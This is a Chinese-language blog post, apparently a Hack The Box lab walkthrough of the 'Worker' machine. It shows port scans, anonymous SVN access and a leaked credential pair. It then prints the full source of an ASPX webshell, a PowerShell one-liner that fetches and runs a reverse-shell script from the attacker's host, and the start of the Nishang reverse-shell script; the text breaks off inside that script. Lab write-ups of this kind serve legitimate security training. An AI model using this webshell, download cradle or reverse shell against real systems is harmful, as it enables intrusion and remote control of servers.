@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ououover.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Worker答案参考：https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;15v7V9_7HfI端口扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758root@kali:~&#x2F;Desktop# nmap -sS -A 10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Worker">
+<meta property="og:url" content="https://ououover.github.io/2020/11/25/HTB-Worker/index.html">
+<meta property="og:site_name" content="OuouOver">
+<meta property="og:description" content="Worker答案参考：https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;15v7V9_7HfI端口扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758root@kali:~&#x2F;Desktop# nmap -sS -A 10">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603859999324-420cdeb0-633d-4206-9431-1407b572237e.png#align=left&display=inline&height=404&margin=%5Bobject%20Object%5D&name=image.png&originHeight=808&originWidth=1452&size=131713&status=done&style=none&width=726">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603860965492-c85287f4-966d-4b76-aa7c-d22404d64987.png#align=left&display=inline&height=665&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1330&originWidth=1298&size=80702&status=done&style=none&width=649">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603861204564-1d2f06d5-54bd-4614-a843-b3b31c268c0f.png#align=left&display=inline&height=474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=948&originWidth=1396&size=146075&status=done&style=none&width=698">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603861392853-828e0cfd-239a-407d-810d-46cf64b1f6fd.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=560&originWidth=703&size=45724&status=done&style=none&width=351.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603861598062-17761a35-726d-4510-bd16-178f7b41d001.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=454&originWidth=832&size=41766&status=done&style=none&width=416">
+<meta property="article:published_time" content="2020-11-25T09:36:09.000Z">
+<meta property="article:modified_time" content="2020-11-25T09:42:40.505Z">
+<meta property="article:author" content="ououover">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603859999324-420cdeb0-633d-4206-9431-1407b572237e.png#align=left&display=inline&height=404&margin=%5Bobject%20Object%5D&name=image.png&originHeight=808&originWidth=1452&size=131713&status=done&style=none&width=726">
+
+<link rel="canonical" href="https://ououover.github.io/2020/11/25/HTB-Worker/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HTB-Worker | OuouOver</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">OuouOver</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ououover.github.io/2020/11/25/HTB-Worker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ououover">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OuouOver">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-Worker
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-25 17:36:09 / 修改时间：17:42:40" itemprop="dateCreated datePublished" datetime="2020-11-25T17:36:09+08:00">2020-11-25</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Worker"><a href="#Worker" class="headerlink" title="Worker"></a>Worker</h1><h4 id="答案参考：https-www-youtube-com-watch-v-15v7V9-7HfI"><a href="#答案参考：https-www-youtube-com-watch-v-15v7V9-7HfI" class="headerlink" title="答案参考：https://www.youtube.com/watch?v=15v7V9_7HfI"></a>答案参考：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=15v7V9_7HfI">https://www.youtube.com/watch?v=15v7V9_7HfI</a></h4><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># nmap -sS -A 10.10.10.203</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 08:44 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.203</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">80/tcp   open  http     Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">3690/tcp open  svnserve Subversion</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|router|printer</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|XP (90%), Linux 2.6.X (86%), HP embedded (86%), Ricoh embedded (86%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:linux:linux_kernel:2.6.32 cpe:/h:hp:procurve_7102dl cpe:/h:ricoh:aficio_sp_c240sf</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows XP SP2 (87%), Linux 2.6.32 (86%), HP ProCurve Secure Router 7102dl (86%), Ricoh Aficio SP C240SF printer (86%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   248.75 ms 10.10.14.1</span><br><span class="line">2   250.46 ms 10.10.10.203</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 54.02 seconds</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/webshells<span class="comment"># nmap -sS 10.10.10.203 -p 0-65535 -v</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 00:52 EDT</span><br><span class="line">Initiating Ping Scan at 00:52</span><br><span class="line">Scanning 10.10.10.203 [4 ports]</span><br><span class="line">Completed Ping Scan at 00:52, 0.28s elapsed (1 total hosts)</span><br><span class="line">Initiating SYN Stealth Scan at 00:52</span><br><span class="line">Scanning devops.worker.htb (10.10.10.203) [65536 ports]</span><br><span class="line">Discovered open port 80/tcp on 10.10.10.203</span><br><span class="line">SYN Stealth Scan Timing: About 4.74% <span class="keyword">done</span>; ETC: 01:03 (0:10:22 remaining)</span><br><span class="line">SYN Stealth Scan Timing: About 10.34% <span class="keyword">done</span>; ETC: 01:02 (0:08:49 remaining)</span><br><span class="line">Discovered open port 5985/tcp on 10.10.10.203</span><br><span class="line">SYN Stealth Scan Timing: About 18.56% <span class="keyword">done</span>; ETC: 01:00 (0:06:39 remaining)</span><br><span class="line">SYN Stealth Scan Timing: About 25.14% <span class="keyword">done</span>; ETC: 01:00 (0:06:09 remaining)</span><br><span class="line">SYN Stealth Scan Timing: About 32.46% <span class="keyword">done</span>; ETC: 01:00 (0:05:20 remaining)</span><br><span class="line">SYN Stealth Scan Timing: About 42.69% <span class="keyword">done</span>; ETC: 00:59 (0:04:07 remaining)</span><br><span class="line">SYN Stealth Scan Timing: About 52.02% <span class="keyword">done</span>; ETC: 00:59 (0:03:17 remaining)</span><br><span class="line">SYN Stealth Scan Timing: About 63.60% <span class="keyword">done</span>; ETC: 00:58 (0:02:20 remaining)</span><br><span class="line">SYN Stealth Scan Timing: About 77.38% <span class="keyword">done</span>; ETC: 00:58 (0:01:20 remaining)</span><br><span class="line">Discovered open port 3690/tcp on 10.10.10.203</span><br><span class="line">SYN Stealth Scan Timing: About 88.50% <span class="keyword">done</span>; ETC: 00:57 (0:00:40 remaining)</span><br><span class="line">Completed SYN Stealth Scan at 00:58, 356.77s elapsed (65536 total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> devops.worker.htb (10.10.10.203)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3690/tcp open  svn</span><br><span class="line">5985/tcp open  wsman</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>对80端口一顿爆破，啥也没有，啥也不是</p>
+<p>额，看看svn，3690端口吧<br>参考：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/svn-brute.html">https://nmap.org/nsedoc/scripts/svn-brute.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># nmap --script svn-brute --script-args svn-brute.repo=/svn/ -p 3690 10.10.10.203</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 08:54 EDT</span><br><span class="line">Segmentation fault</span><br><span class="line">root@kali:~/Desktop<span class="comment"># nmap  -p 3690 10.10.10.203 --script svn-brute --script-args svn-brute.repo=/svn/ </span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 08:54 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.203</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3690/tcp open  svn</span><br><span class="line">| svn-brute:   </span><br><span class="line">|_  Anonymous SVN detected, no authentication needed</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.98 seconds</span><br><span class="line">root@kali:~/Desktop<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p>发现svn未授权</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>先查一下有啥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># svn list svn://10.10.10.203</span></span><br><span class="line">dimension.worker.htb/</span><br><span class="line">moved.txt</span><br></pre></td></tr></table></figure>
+<p>不管三七二十一了，先下载看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/svndir<span class="comment"># svn checkout svn://10.10.10.203</span></span><br></pre></td></tr></table></figure>
+<p>查看提交的内容变化，看到了点东西</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/svndir<span class="comment"># svn diff -r 2 svn://10.10.10.203 </span></span><br><span class="line">Index: deploy.ps1</span><br><span class="line">===================================================================</span><br><span class="line">--- deploy.ps1  (revision 2)</span><br><span class="line">+++ deploy.ps1  (nonexistent)</span><br><span class="line">@@ -1,6 +0,0 @@</span><br><span class="line">-<span class="variable">$user</span> = <span class="string">&quot;nathen&quot;</span> </span><br><span class="line">-<span class="variable">$plain</span> = <span class="string">&quot;wendel98&quot;</span></span><br><span class="line">-<span class="variable">$pwd</span> = (<span class="variable">$plain</span> | ConvertTo-SecureString)</span><br><span class="line">-<span class="variable">$Credential</span> = New-Object System.Management.Automation.PSCredential <span class="variable">$user</span>, <span class="variable">$pwd</span></span><br><span class="line">-<span class="variable">$args</span> = <span class="string">&quot;Copy-Site.ps1&quot;</span></span><br><span class="line">-Start-Process powershell.exe -Credential <span class="variable">$Credential</span> -ArgumentList (<span class="string">&quot;-file <span class="variable">$args</span>&quot;</span>)</span><br><span class="line">Index: moved.txt</span><br><span class="line">===================================================================</span><br><span class="line">--- moved.txt   (nonexistent)</span><br><span class="line">+++ moved.txt   (revision 5)</span><br><span class="line">@@ -0,0 +1,5 @@</span><br><span class="line">+This repository has been migrated and will no longer be maintaned here.</span><br><span class="line">+You can find the latest version at: http://devops.worker.htb</span><br><span class="line">+</span><br><span class="line">+// The Worker team :)</span><br><span class="line">+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>直接访问<a target="_blank" rel="noopener" href="http://devops.worker.htb/">http://devops.worker.htb</a> 不通，大佬说要在hosts绑定下<br>使用nathen/wende198访问<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1760605/1603859999324-420cdeb0-633d-4206-9431-1407b572237e.png#align=left&display=inline&height=404&margin=%5Bobject%20Object%5D&name=image.png&originHeight=808&originWidth=1452&size=131713&status=done&style=none&width=726" alt="image.png"><br>这不是源码吗，那不就可以上传webshell了<br>这里使用kali的webshell cmdaps.apsx</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/svndir<span class="comment"># </span></span><br><span class="line">root@kali:~/Desktop/svndir<span class="comment"># cat cmdasp.aspx </span></span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;C#&quot;</span> Debug=<span class="string">&quot;true&quot;</span> Trace=<span class="string">&quot;false&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.Diagnostics&quot;</span> %&gt;</span><br><span class="line">&lt;%@ Import Namespace=<span class="string">&quot;System.IO&quot;</span> %&gt;</span><br><span class="line">&lt;script Language=<span class="string">&quot;c#&quot;</span> runat=<span class="string">&quot;server&quot;</span>&gt;</span><br><span class="line">void Page_Load(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">string ExcuteCmd(string arg)</span><br><span class="line">&#123;</span><br><span class="line">ProcessStartInfo psi = new ProcessStartInfo();</span><br><span class="line">psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">psi.Arguments = <span class="string">&quot;/c &quot;</span>+arg;</span><br><span class="line">psi.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">psi.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">Process p = Process.Start(psi);</span><br><span class="line">StreamReader stmrdr = p.StandardOutput;</span><br><span class="line">string s = stmrdr.ReadToEnd();</span><br><span class="line">stmrdr.Close();</span><br><span class="line"><span class="built_in">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line">void cmdExe_Click(object sender, System.EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">Response.Write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));</span><br><span class="line">Response.Write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;title&gt;awen asp.net webshell&lt;/title&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line">&lt;body &gt;</span><br><span class="line">&lt;form id=<span class="string">&quot;cmd&quot;</span> method=<span class="string">&quot;post&quot;</span> runat=<span class="string">&quot;server&quot;</span>&gt;</span><br><span class="line">&lt;asp:TextBox id=<span class="string">&quot;txtArg&quot;</span> style=<span class="string">&quot;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px&quot;</span> runat=<span class="string">&quot;server&quot;</span> Width=<span class="string">&quot;250px&quot;</span>&gt;&lt;/asp:TextBox&gt;</span><br><span class="line">&lt;asp:Button id=<span class="string">&quot;testing&quot;</span> style=<span class="string">&quot;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px&quot;</span> runat=<span class="string">&quot;server&quot;</span> Text=<span class="string">&quot;excute&quot;</span> OnClick=<span class="string">&quot;cmdExe_Click&quot;</span>&gt;&lt;/asp:Button&gt;</span><br><span class="line">&lt;asp:Label id=<span class="string">&quot;lblText&quot;</span> style=<span class="string">&quot;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px&quot;</span> runat=<span class="string">&quot;server&quot;</span>&gt;Command:&lt;/asp:Label&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) --&gt;</span><br><span class="line">&lt;!--    http://michaeldaw.org   04/2007    --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上传后，远程执行powershell反弹shell<br>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/132644184">https://zhuanlan.zhihu.com/p/132644184</a><br>在cmd执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.14.39:8088/rev.ps1&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/svndir<span class="comment"># cat rev.ps1 </span></span><br><span class="line"><span class="keyword">function</span> Invoke-PowerShellTcp </span><br><span class="line">&#123; </span><br><span class="line">&lt;<span class="comment">#</span></span><br><span class="line">.SYNOPSIS</span><br><span class="line">Nishang script <span class="built_in">which</span> can be used <span class="keyword">for</span> Reverse or Bind interactive PowerShell from a target. </span><br><span class="line">.DESCRIPTION</span><br><span class="line">This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. </span><br><span class="line">Also, a standard netcat can connect to this script Bind to a specific port.</span><br><span class="line">The script is derived from Powerfun written by Ben Turner &amp; Dave Hardy</span><br><span class="line">.PARAMETER IPAddress</span><br><span class="line">The IP address to connect to when using the -Reverse switch.</span><br><span class="line">.PARAMETER Port</span><br><span class="line">The port to connect to when using the -Reverse switch. When using -Bind it is the port on <span class="built_in">which</span> this script listens.</span><br><span class="line">.EXAMPLE</span><br><span class="line">PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444</span><br><span class="line">Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on </span><br><span class="line">the given IP and port. </span><br><span class="line">.EXAMPLE</span><br><span class="line">PS &gt; Invoke-PowerShellTcp -Bind -Port 4444</span><br><span class="line">Above shows an example of an interactive PowerShell <span class="built_in">bind</span> connect shell. Use a netcat/powercat to connect to this port. </span><br><span class="line">.EXAMPLE</span><br><span class="line">PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444</span><br><span class="line">Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be</span><br><span class="line">listening on the given IP and port. </span><br><span class="line">.LINK</span><br><span class="line">http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html</span><br><span class="line">https://github.com/nettitude/powershell/blob/master/powerfun.ps1</span><br><span class="line">https://github.com/samratashok/nishang</span><br><span class="line"><span class="comment">#&gt;      </span></span><br><span class="line">    [CmdletBinding(DefaultParameterSetName=<span class="string">&quot;reverse&quot;</span>)] Param(</span><br><span class="line"></span><br><span class="line">        [Parameter(Position = 0, Mandatory = <span class="variable">$true</span>, ParameterSetName=<span class="string">&quot;reverse&quot;</span>)]</span><br><span class="line">        